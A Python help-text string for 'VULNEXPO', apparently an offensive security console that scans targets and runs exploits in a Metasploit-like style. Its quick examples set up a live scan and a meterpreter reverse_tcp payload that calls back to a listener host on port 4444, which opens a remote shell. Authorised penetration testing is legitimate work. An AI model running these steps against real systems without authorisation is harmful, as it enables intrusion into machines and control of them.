HELP_TEXT = """
VULNEXPO — Commands (enter exactly as shown)

Basic
  help                        - show this help text
  exit / quit                 - exit VULNEXPO

Module selection & info
  use <vd|exploit>            - load a module (vd = vuln_detect)
  info                        - show info about the currently loaded module
  show modules                - list available modules

Options (set / view)
  set KEY VALUE               - set an option (e.g. TARGET, LIVE, AGGRESSIVE, LHOST)
  show options                - display current options for loaded module
  unset KEY                   - remove/reset an option

Discovery / Scanning
  run                         - execute the loaded module (dry-run by default)
  set LIVE true|false         - enable real (live) scans (requires permission)
  set AGGRESSIVE true|false   - enable aggressive scan mode (full port, NSE, etc.)
  set TARGET <ip|host>        - target to scan

Output & results
  show results                - print last scan JSON summary to console
  show findings               - print aggregated findings (grouped by port)
  export report <path>        - export last result as Markdown report to path
  save session <name>         - save current options/state to sessions/<name>.json
  load session <name>         - load saved session

Exploitation (when exploit module loaded)
  set PAYLOAD <msf/payload>    - set payload (e.g., windows/meterpreter/reverse_tcp)
  set LHOST <ip>              - listener host for payloads
  set LPORT <port>            - listener port for payloads
  run                         - run exploit (dry-run unless LIVE=true)
  sessions                    - list active sessions
  interact <session-id>       - interact with an active session
  cleanup <session-id>        - cleanup and remove a session

Administration & utilities
  reload signatures           - reload vuln signature DB without restarting
  set VERBOSE true|false      - toggle detailed console logs
  clear                       - clear the console screen
  history                     - show last commands entered

Quick examples
  set TARGET 10.10.10.5
  set LIVE true
  set AGGRESSIVE true
  run

  use exploit
  set TARGET 10.10.10.5
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST 10.10.3.5
  set LPORT 4444
  set LIVE true
  run
"""
